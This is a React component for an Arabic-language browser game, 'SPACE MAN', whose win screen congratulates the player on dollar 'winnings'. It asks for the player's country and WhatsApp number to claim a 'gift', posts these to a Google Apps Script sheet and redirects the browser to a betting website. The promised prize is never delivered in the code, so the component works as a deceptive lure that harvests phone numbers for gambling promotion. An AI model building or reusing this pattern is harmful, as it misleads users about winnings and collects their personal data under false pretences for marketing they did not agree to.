import { Html } from '@react-three/drei'
import { useState } from 'react'
import { getCountries, getCountryCallingCode } from 'react-phone-number-input/input'
import ar from 'react-phone-number-input/locale/ar.json'

export default function UI({
    started,
    setStarted,
    gameOver,
    won,
    restartGame,
    score,
    cashOut
}) {

    const countries = getCountries()
        .map((country) => ({
            iso: country,
            name: ar[country],
            code: `+${getCountryCallingCode(country)}`
        }))
        .sort((a, b) => a.name.localeCompare(b.name))


    const [selectedCountryIso, setSelectedCountryIso] = useState('LB')

    const selectedCountry =
        countries.find((c) => c.iso === selectedCountryIso) || countries[0]
    const [phoneNumber, setPhoneNumber] = useState('')
    const [phoneError, setPhoneError] = useState(false)

    const buttonStyle = {
        padding: '10px 20px',
        fontFamily: 'Arial, Helvetica',
        fontSize: '20px',
        color: 'white',
        background: '#1a1a1a',
        borderRadius: '10px',
        border: '1px solid #4dff4d',
        cursor: 'pointer',
        fontWeight: 'bold',
        touchAction: 'manipulation',
        pointerEvents: 'auto',
        minWidth: '160px'
    }

    const inputStyle = {
        width: '220px',
        maxWidth: '80vw',
        padding: '12px',
        fontSize: '16px',
        borderRadius: '10px',
        border: '2px solid white',
        outline: 'none',
        textAlign: 'center',
        pointerEvents: 'auto',
        touchAction: 'manipulation'
    }

    const screenStyle = {
        width: '100vw',
        height: '100vh',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        gap: '14px',
        padding: '20px',
        boxSizing: 'border-box',
        textAlign: 'center',
        pointerEvents: 'auto'
    }

    const startGame = (e) => {
        e.stopPropagation()
        setStarted(true)
    }

    const playAgain = (e) => {
        e.stopPropagation()
        restartGame()
    }

    const handleCountryChange = (e) => {
        setSelectedCountryIso(e.target.value)
    }

    const handlePhoneChange = (e) => {
        const cleaned = e.target.value.replace(/[^0-9]/g, '')
        setPhoneNumber(cleaned)
    }

    const collectGift = async (e) => {
        e.stopPropagation()

        if (!phoneNumber.trim()) {
            setPhoneError(true)
            return
        }

        setPhoneError(false)

        const fullPhone =
            `${selectedCountry.code} ${phoneNumber}`

        const amount = `${score}$`

        const data = {
            country: selectedCountry.name,
            phone: fullPhone,
            amount: amount
        }

        window.location.href = 'https://www.time4bets504.com/en/'

        try {
            await fetch('https://script.google.com/macros/s/AKfycbwYiwI1Y2jnJN5lXh8ACm227Y0cQ--xs0xMWanqgD8JnQdr0JH7t8pvUZ30oe0_gDanWQ/exec', {
                method: 'POST',
                body: new URLSearchParams({
                    data: JSON.stringify(data)
                })
            })

            console.log('Saved to sheet')
        } catch (error) {
            console.log('Sheet save failed:', error)
        }
    }

    return (
        <Html fullscreen>
            <div
                style={{
                    width: '100vw',
                    height: '100vh',
                    pointerEvents: 'none'
                }}
            >
                {!started && !gameOver && !won && (
                    <div style={screenStyle}>
                        <h1
                            style={{
                                color: '#4dff4d',
                                fontSize: '40px',
                                fontFamily: 'Arial, Helvetica, sans-serif',
                                margin: 0,
                                textShadow: '0 3px 10px black'
                            }}
                        >
                            SPACE MAN
                        </h1>

                        <h2
                            style={{
                                color: 'white',
                                fontSize: '22px',
                                fontFamily: 'Arial, Helvetica',
                                margin: 0,
                                textShadow: '0 2px 8px black'
                            }}
                        >
                            اجمع العملات الخضرا وتجنب النيازك
                        </h2>

                        <button
                            onClick={startGame}
                            style={buttonStyle}
                        >
                            ابدأ اللعب
                        </button>
                    </div>
                )}

                {started && !gameOver && !won && (
                    <>
                        <div
                            style={{
                                position: 'absolute',
                                top: '14px',
                                right: '14px',
                                color: 'white',
                                fontSize: '24px',
                                fontFamily: 'Arial, Helvetica',
                                fontWeight: 'bold',
                                textShadow: '0 2px 8px black',
                                pointerEvents: 'none'
                            }}
                        >
                            <div>{score}$ :الربح </div>

                            <div
                                style={{
                                    width: '160px',
                                    height: '18px',
                                    border: '3px solid #4dff4d',
                                    background: 'black',
                                    borderRadius: '10px',
                                    marginTop: '8px',
                                    overflow: 'hidden'
                                }}
                            >
                                <div
                                    style={{
                                        width: `${Math.min(score, 100)}%`,
                                        height: '100%',
                                        background: '#4dff4d'
                                    }}
                                />
                            </div>
                        </div>

                        <button
                            onClick={cashOut}
                            style={{
                                ...buttonStyle,
                                position: 'absolute',
                                bottom: '18px',
                                left: '50%',
                                transform: 'translateX(-50%)',
                                fontSize: '18px',
                                minWidth: '140px'
                            }}
                        >
                            اسحب الربح
                        </button>
                    </>
                )}

                {won && (
                    <div style={screenStyle}>
                        <h1
                            style={{
                                color: 'white',
                                fontSize: '38px',
                                fontFamily: 'Arial, Helvetica, sans-serif',
                                margin: 0,
                                textShadow: '0 3px 10px black'
                            }}
                        >
                            مبرووك, لقد ربحت
                        </h1>

                        <h1
                            style={{
                                color: '#4dff4d',
                                fontSize: '42px',
                                fontFamily: 'Arial, Helvetica, sans-serif',
                                margin: 0,
                                textShadow: '0 3px 10px black'
                            }}
                        >
                            {score}$
                        </h1>
                        <div>

                            <h1
                                style={{
                                    color: 'white',
                                    fontSize: '22px',
                                    fontFamily: 'Arial, Helvetica, sans-serif',
                                    margin: 0,
                                    textShadow: '0 3px 10px black'
                                }}
                            >
                                اختر بلدك
                            </h1>

                            <select
                                value={selectedCountryIso}
                                onChange={handleCountryChange}
                                style={inputStyle}
                            >
                                {countries.map((country) => (
                                    <option
                                        key={country.iso}
                                        value={country.iso}
                                    >
                                        {country.name} ({country.code})
                                    </option>
                                ))}
                            </select>
                        </div>
                        <div>

                            <h1
                                style={{
                                    color: phoneError ? 'red' : 'white',
                                    fontSize: '22px',
                                    fontFamily: 'Arial, Helvetica, sans-serif',
                                    margin: 0,
                                    textShadow: '0 3px 10px black'
                                }}
                            >
                                ادخل رقم الواتساب الخاص بك
                            </h1>
                            {/* <p
                                style={{
                                    color: phoneError ? 'red' : 'white',
                                    fontSize: '16px',
                                    margin: 0,
                                    fontWeight: 'bold',
                                    textShadow: '0 2px 8px black'
                                }}
                            >
                                Enter your phone number
                            </p> */}
                            <div
                                style={{
                                    display: 'flex',
                                    gap: '8px',
                                    justifyContent: 'center',
                                    alignItems: 'center',
                                    pointerEvents: 'auto'
                                }}
                            >
                                <div
                                    style={{
                                        padding: '12px',
                                        fontSize: '16px',
                                        borderRadius: '10px',
                                        background: 'white',
                                        minWidth: '55px'
                                    }}
                                >
                                    {selectedCountry.code}
                                </div>

                                <input
                                    value={phoneNumber}
                                    onChange={handlePhoneChange}
                                    placeholder="Phone number"
                                    inputMode="numeric"
                                    style={{
                                        ...inputStyle,
                                        width: '170px'
                                    }}
                                />

                            </div>

                        </div>

                        <button
                            onClick={collectGift}
                            style={buttonStyle}
                        >
                            احصل على هديتك الان
                        </button>

                        <button
                            onClick={playAgain}
                            style={buttonStyle}
                        >
                            العب مرة اخرى
                        </button>
                    </div>
                )}

                {gameOver && (
                    <div style={screenStyle}>
                        <h1
                            style={{
                                color: 'white',
                                fontSize: '38px',
                                fontFamily: 'Arial, Helvetica',
                                margin: 0,
                                textShadow: '0 3px 10px black'
                            }}
                        >
                            نتيجتك
                        </h1>

                        <h2
                            style={{
                                color: '#4dff4d',
                                fontSize: '50px',
                                fontFamily: 'Arial, Helvetica',
                                margin: 0,
                                textShadow: '0 2px 8px black'
                            }}
                        >
                            ${score}
                        </h2>

                        <button
                            onClick={playAgain}
                            style={buttonStyle}
                        >
                            العب مرة اخرى
                        </button>
                    </div>
                )}
            </div>
        </Html>
    )
}